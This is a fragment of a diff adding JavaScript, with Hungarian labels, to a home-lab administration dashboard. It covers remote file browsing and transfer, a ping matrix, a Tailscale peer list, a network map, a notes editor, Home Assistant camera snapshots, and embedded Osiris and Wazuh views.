+            <button onclick="fbDownload('${_esc(e.path)}')" title="Böngészőbe letöltés"
+              style="background:transparent;border:1px solid var(--blue);color:var(--blue);border-radius:3px;padding:1px 7px;cursor:pointer;font-size:.65rem;">⬇</button>
+          </div>`
+        : '<span style="width:76px;display:inline-block;"></span>'}
+    </div>`;
+  }
+  list.innerHTML = html;
+}
+
+function _fbIcon(name) {
+  const ext = (name.split('.').pop()||'').toLowerCase();
+  return {pdf:'📄',txt:'📃',md:'📃',sh:'⚙️',py:'🐍',js:'📜',ts:'📜',
+    html:'🌐',css:'🎨',jpg:'🖼️',jpeg:'🖼️',png:'🖼️',gif:'🖼️',svg:'🖼️',
+    zip:'📦',tar:'📦',gz:'📦',rar:'📦','7z':'📦',
+    mp4:'🎬',mkv:'🎬',avi:'🎬',mp3:'🎵',
+    exe:'⚡',bin:'⚡',elf:'⚡',deb:'📦',conf:'🔧',json:'📋',xml:'📋',
+  }[ext] || '📄';
+}
+
+function fbDownload(path) {
+  const mid = el('fb-machine')?.value;
+  window.open(`/api/download/${mid}?path=${encodeURIComponent(path)}`, '_blank');
+}
+
+function fbPullToServer(path, btn) {
+  const mid = el('fb-machine')?.value;
+  const orig = btn.textContent;
+  btn.textContent = '⏳';
+  btn.disabled = true;
+  fetch(`/api/pull/${mid}`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({ path }),
+  }).then(r => r.json()).then(data => {
+    btn.disabled = false;
+    if (data.error) {
+      btn.textContent = '❌';
+      btn.style.borderColor = 'var(--red)';
+      btn.style.color = 'var(--red)';
+      btn.title = data.error;
+      setTimeout(() => { btn.textContent = orig; btn.style.borderColor=''; btn.style.color=''; btn.title='Másolás a server ~/Downloads mappájába'; }, 3000);
+    } else {
+      btn.textContent = '✓';
+      btn.style.borderColor = 'var(--green)';
+      btn.style.color = 'var(--green)';
+      btn.title = '✓ Elmentve: ' + data.dest + (data.size ? ' (' + fmtBytes(data.size) + ')' : '');
+      setTimeout(() => { btn.textContent = orig; btn.title='Másolás a server ~/Downloads mappájába'; }, 3000);
+    }
+  }).catch(() => {
+    btn.disabled = false;
+    btn.textContent = '❌';
+    setTimeout(() => { btn.textContent = orig; }, 2000);
+  });
+}
+
+function fbUpload(input) {
+  const mid  = el('fb-machine')?.value;
+  const path = fbCurrentPath();
+  Promise.all(Array.from(input.files).map(f => {
+    const fd = new FormData();
+    fd.append('file', f); fd.append('path', path);
+    return fetch(`/api/upload/${mid}`, { method:'POST', body: fd }).then(r => r.json());
+  })).then(results => {
+    const errs = results.filter(r => r.error);
+    if (errs.length) alert('❌ ' + errs.map(e => e.error).join('\n'));
+    fbNavigate(path);
+    input.value = '';
+  });
+}
+
+// ── Ping mátrix ───────────────────────────────────────────────────────────────
+function loadPingMatrix() {
+  const wrap   = el('ping-matrix-wrap');
+  const status = el('pmat-status');
+  wrap.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);">⏳ Ping küldése...</div>';
+  if (status) status.textContent = '⏳';
+
+  fetch('/api/ping-matrix').then(r => r.json()).then(data => {
+    if (data.error) {
+      wrap.innerHTML = `<div style="padding:16px;color:var(--red);">❌ ${data.error}</div>`;
+      return;
+    }
+    const mids = Object.keys(data.machines);
+    let html = '<table class="pm-table" style="width:100%;border-collapse:collapse;">';
+    html += '<thead><tr><th style="text-align:left;padding-left:12px;">Gép</th><th>Ping</th><th>Állapot</th></tr></thead><tbody>';
+    for (const mid of mids) {
+      const ms  = data.results[mid];
+      const cls = ms===null ? 'pm-fail' : ms<5 ? 'pm-ok' : ms<50 ? 'pm-warn' : 'pm-fail';
+      html += `<tr>
+        <td style="text-align:left;padding-left:12px;font-weight:600;color:var(--text);">${data.machines[mid]}</td>
+        <td class="${cls}">${ms===null ? '—' : ms.toFixed(1)+' ms'}</td>
+        <td class="${cls}">${ms===null ? '⛔ Offline' : '✓ Online'}</td>
+      </tr>`;
+    }
+    html += '</tbody></table>';
+    wrap.innerHTML = html;
+    if (status) status.textContent = new Date().toLocaleTimeString('hu-HU');
+  });
+}
+
+// ── Tailscale ─────────────────────────────────────────────────────────────────
+function loadTailscale() {
+  const wrap = el('tailscale-wrap');
+  wrap.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);">⏳ Betöltés...</div>';
+  fetch('/api/tailscale').then(r => r.json()).then(data => {
+    if (data.error) {
+      wrap.innerHTML = `<div style="padding:16px;color:var(--red);">❌ ${data.error}</div>`;
+      return;
+    }
+    if (data.raw) {
+      wrap.innerHTML = `<pre style="padding:10px;font-size:.72rem;color:var(--text);white-space:pre-wrap;word-break:break-all;">${data.raw}</pre>`;
+      return;
+    }
+    const s = data.self || {};
+    let html = `<div style="background:var(--header);padding:8px 12px;font-size:.72rem;border-bottom:1px solid var(--border);">
+      <span style="color:var(--muted);">Ez a gép:</span>
+      <b style="color:var(--blue);margin-left:6px;">${s.hostname||'?'}</b>
+      <span style="color:var(--muted);margin-left:6px;">${s.ip||''}</span>
+    </div>`;
+    for (const p of (data.peers||[])) {
+      const dot = p.online ? '🟢' : '🔴';
+      html += `<div class="ts-peer">
+        <span style="font-size:.9rem;">${dot}</span>
+        <div style="flex:1;">
+          <div style="font-weight:600;color:var(--text);">${p.hostname}</div>
+          <div style="font-size:.65rem;color:var(--muted);">${p.ip}${p.os?' · '+p.os:''}</div>
+        </div>
+        <div style="font-size:.65rem;color:${p.online?'var(--green)':'var(--muted)'};">${p.online?'Online':'Offline'}</div>
+      </div>`;
+    }
+    if (!data.peers?.length) html += '<div style="padding:16px;text-align:center;color:var(--muted);">Nincs peer</div>';
+    wrap.innerHTML = html;
+  });
+}
+
+// ── Hálózati térkép (tab inline) ──────────────────────────────────────────────
+let _netTabVis = null;
+
+function loadNetTabMap() {
+  fetch('/api/network').then(r => r.json()).then(data => {
+    const nodes = new vis.DataSet(data.nodes.map(n => ({
+      ...n, ...(GROUP_STYLES[n.group]||GROUP_STYLES.online),
+      borderWidth:2, font:{...(GROUP_STYLES[n.group]||{}).font,face:'Consolas',size:12},
+    })));
+    const edges = new vis.DataSet(data.edges.map((e,i) => ({
+      id:i, from:e.from, to:e.to, label:e.label||'', dashes:e.dashes,
+      color:{color:e.dashes?'#bc8cff':'#58a6ff',opacity:0.7},
+      font:{color:'#8b949e',size:10,face:'Consolas',align:'middle'},
+      width:2, smooth:{type:'curvedCW',roundness:0.15},
+    })));
+    const container = el('net-tab-map');
+    if (_netTabVis) _netTabVis.destroy();
+    _netTabVis = new vis.Network(container, {nodes,edges}, {
+      nodes:{borderWidth:2,margin:8},
+      edges:{arrows:{to:{enabled:true,scaleFactor:0.5}}},
+      physics:{solver:'forceAtlas2Based',forceAtlas2Based:{gravitationalConstant:-50,springLength:100},stabilization:{iterations:100}},
+      interaction:{hover:true},
+    });
+    _netTabVis.on('stabilizationIterationsDone',()=>_netTabVis.setOptions({physics:{enabled:false}}));
+  });
+}
+
+// ── Jegyzetek ─────────────────────────────────────────────────────────────────
+let _notes = {}, _noteKey = null;
+
+function loadNotes() {
+  fetch('/api/notes').then(r => r.json()).then(data => {
+    _notes = data; renderNoteList();
+  });
+}
+
+function renderNoteList() {
+  const list = el('note-list');
+  if (!list) return;
+  const keys = Object.keys(_notes).sort((a,b) =>
+    ((_notes[b]||{}).updated||0) - ((_notes[a]||{}).updated||0));
+  if (!keys.length) {
+    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);font-size:.78rem;">Még nincs jegyzet<br><span style="font-size:.68rem;">Kattints az + Új gombra</span></div>';
+    return;
+  }
+  list.innerHTML = keys.map(k => {
+    const n = _notes[k]||{};
+    const preview = (n.content||'').replace(/#+\s*/g,'').substring(0,55);
+    const ts = n.updated ? new Date(n.updated*1000).toLocaleDateString('hu-HU',{month:'short',day:'numeric'}) : '';
+    return `<div class="note-item${k===_noteKey?' active':''}" onclick="openNote(${JSON.stringify(k)})">
+      <div style="font-weight:600;color:var(--text);margin-bottom:2px;">${k}</div>
+      <div style="font-size:.65rem;color:var(--muted);">${preview||'—'}</div>
+      <div style="font-size:.6rem;color:var(--muted);margin-top:3px;text-align:right;">${ts}</div>
+    </div>`;
+  }).join('');
+}
+
+function openNote(key) {
+  _noteKey = key;
+  const n = _notes[key]||{};
+  el('note-key-input').value  = key;
+  el('note-editor').value     = n.content||'';
+  el('note-del-btn').style.display = 'inline-block';
+  el('note-saved-lbl').style.display = 'none';
+  renderNoteList();
+}
+
+function openNewNote() {
+  _noteKey = null;
+  el('note-key-input').value  = '';
+  el('note-editor').value     = '';
+  el('note-del-btn').style.display  = 'none';
+  el('note-saved-lbl').style.display = 'none';
+  el('note-key-input').focus();
+  renderNoteList();
+}
+
+function saveNote() {
+  const key     = el('note-key-input').value.trim();
+  const content = el('note-editor').value;
+  if (!key) { el('note-key-input').focus(); return; }
+  fetch('/api/notes', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ key, content }),
+  }).then(r => r.json()).then(data => {
+    if (!data.ok) { alert('❌ Mentés sikertelen'); return; }
+    _noteKey = key;
+    _notes[key] = { content, updated: Date.now()/1000 };
+    renderNoteList();
+    el('note-del-btn').style.display = 'inline-block';
+    const s = el('note-saved-lbl');
+    s.style.display = 'inline';
+    setTimeout(() => { s.style.display = 'none'; }, 2500);
+  });
+}
+
+function deleteNote() {
+  if (!_noteKey || !confirm(`Töröljük: "${_noteKey}"?`)) return;
+  fetch(`/api/notes/${encodeURIComponent(_noteKey)}`, { method:'DELETE' })
+    .then(r => r.json()).then(data => {
+      if (data.ok) { delete _notes[_noteKey]; _noteKey = null; openNewNote(); }
+    });
+}
+
+document.addEventListener('keydown', e => {
+  if (e.ctrlKey && e.key==='s') {
+    if (document.getElementById('tab-notes')?.classList.contains('active')) {
+      e.preventDefault(); saveNote();
+    }
+  }
+});
+
+// ── Camera tab ────────────────────────────────────────────────────────────────
+let _camData = [];
+let _camAutoTimer = null;
+let _camInited = false;
+
+async function initCameras() {
+  if (_camInited) return;
+  _camInited = true;
+  await loadCameraConfig();
+  if (document.getElementById('cam-autorefresh').checked) startCamAutorefresh();
+}
+
+let _osirisInited = false;
+function initOsiris() {
+  if (_osirisInited) return;
+  _osirisInited = true;
+  const frame = document.getElementById("osiris-frame");
+  const status = document.getElementById("osiris-status");
+  frame.src = "http://localhost:3000";
+  frame.onload = () => { status.textContent = ""; status.style.color = "var(--green)"; };
+  frame.onerror = () => { status.textContent = "nem érhető el"; status.style.color = "var(--red)"; };
+  setTimeout(() => {
+    if (!frame.contentDocument && status.textContent === "betöltés...") {
+      status.textContent = "✓ betöltve";
+      status.style.color = "var(--green)";
+    }
+  }, 4000);
+}
+
+let _wazuhInited = false;
+function initWazuh() {
+  if (_wazuhInited) return;
+  _wazuhInited = true;
+  const frame = document.getElementById("wazuh-frame");
+  const status = document.getElementById("wazuh-status");
+  frame.src = "https://wazuh.lab";
+  frame.onload = () => { status.textContent = ""; };
+  setTimeout(() => {
+    if (status.textContent === "betöltés...") {
+      status.textContent = "✓ betöltve";
+      status.style.color = "var(--green)";
+    }
+  }, 5000);
+}
+
+async function loadCameraConfig() {
+  try {
+    const r = await fetch('/api/cameras');
+    const d = await r.json();
+    _camData = d.cameras || [];
+    const configured = d.configured;
+    document.getElementById('cam-token-warn').style.display = configured ? 'none' : 'block';
+    document.getElementById('cam-ha-link').href = d.ha_url || 'http://192.168.0.112:8123';
+    renderCameraGrid(configured);
+    refreshAllCams();
+  } catch(e) {
+    document.getElementById('cam-status-badge').textContent = '❌ API hiba';
+  }
+}
+
+function renderCameraGrid(hasToken) {
+  const grid = document.getElementById('cam-grid');
+  if (!_camData.length) {
+    grid.innerHTML = `<div class="col-12" style="text-align:center;padding:40px;color:var(--muted);">
+      <span style="font-size:2rem">📷</span><br>
+      <span style="font-size:.85rem">Nincs kamera konfigurálva a config.json-ban</span>
+    </div>`;
+    return;
+  }
+  let html = '';
+  for (const cam of _camData) {
+    const eid = cam.entity_id;
+    const safe = eid.replace(/[^a-z0-9_]/g, '_');
+    html += `
+    <div class="col-xl-6 col-lg-6 col-12">
+      <div class="cam-card">
+        <div class="cam-card-head">
+          <span class="cam-card-label">📷 ${cam.name || eid}</span>
+          <span class="cam-card-ip">${cam.ip || ''}</span>
+          <span id="badge-${safe}" class="cam-badge ${hasToken ? 'live' : 'notoken'}">${hasToken ? 'LIVE' : 'NO TOKEN'}</span>
+        </div>
+        <div class="cam-card-body" id="body-${safe}">
+          ${hasToken
+            ? `<img id="img-${safe}" src="/api/camera_snapshot/${eid}?t=${Date.now()}"
+                   alt="${cam.name}" loading="lazy"
+                   onerror="camError('${safe}')"
+                   onload="camOk('${safe}')">`
+            : `<div class="cam-offline">🔒 HA token szükséges</div>`}
+        </div>
+        <div class="cam-footer">
+          <span id="ts-${safe}" style="color:var(--muted);">—</span>
+          <button onclick="refreshCam('${eid}','${safe}')"
+            style="margin-left:auto;background:transparent;border:1px solid var(--border);color:var(--muted);border-radius:4px;padding:1px 8px;cursor:pointer;font-size:.72rem;">↺</button>
+          <a href="/api/camera_snapshot/${eid}?t=${Date.now()}" target="_blank"
+             style="color:var(--blue);font-size:.72rem;text-decoration:none;">⬡ Kép</a>
+        </div>
+      </div>
+    </div>`;
+  }
+  grid.innerHTML = html;
+  updateCamStatusBadge();
+}
+
+function camError(safe) {
+  const body = document.getElementById('body-' + safe);
+  const badge = document.getElementById('badge-' + safe);
+  if (body) body.innerHTML = '<div class="cam-offline">📵 Nem elérhető<br><small>HA integráció hiányzik vagy kamera offline</small></div>';
+  if (badge) { badge.textContent = 'OFFLINE'; badge.className = 'cam-badge offline'; }
+}
+
+function camOk(safe) {
+  const badge = document.getElementById('badge-' + safe);
+  const ts = document.getElementById('ts-' + safe);
+  if (badge) { badge.textContent = 'LIVE'; badge.className = 'cam-badge live'; }
+  if (ts) ts.textContent = 'Frissítve: ' + new Date().toLocaleTimeString('hu-HU');
+}
+
+function refreshCam(entityId, safe) {
+  const img = document.getElementById('img-' + safe);
+  if (!img) return;
+  img.src = `/api/camera_snapshot/${entityId}?t=${Date.now()}`;
+  const ts = document.getElementById('ts-' + safe);
+  if (ts) ts.textContent = 'Frissítés…';
+}
+
+function refreshAllCams() {
+  for (const cam of _camData) {
+    const safe = cam.entity_id.replace(/[^a-z0-9_]/g, '_');
+    refreshCam(cam.entity_id, safe);
+  }
+  updateCamStatusBadge();
+}
+
+function updateCamStatusBadge() {
+  const badge = document.getElementById('cam-status-badge');
+  if (!badge) return;
+  badge.textContent = `📷 ${_camData.length} kamera • ${new Date().toLocaleTimeString('hu-HU')}`;
+  badge.style.color = 'var(--text)';
+}
+
+function toggleCamAutorefresh() {
+  if (document.getElementById('cam-autorefresh').checked) {
+    startCamAutorefresh();
+  } else {
+    if (_camAutoTimer) { clearInterval(_camAutoTimer); _camAutoTimer = null; }
+  }
+}
+
+function startCamAutorefresh() {
+  if (_camAutoTimer) clearInterval(_camAutoTimer);
+  _camAutoTimer = setInterval(() => {
+    if (document.getElementById('tab-cameras')?.classList.contains('active')) {
+      refreshAllCams();
+    }
+  }, 5000);
+}
+</script>
+</body>
+</html>
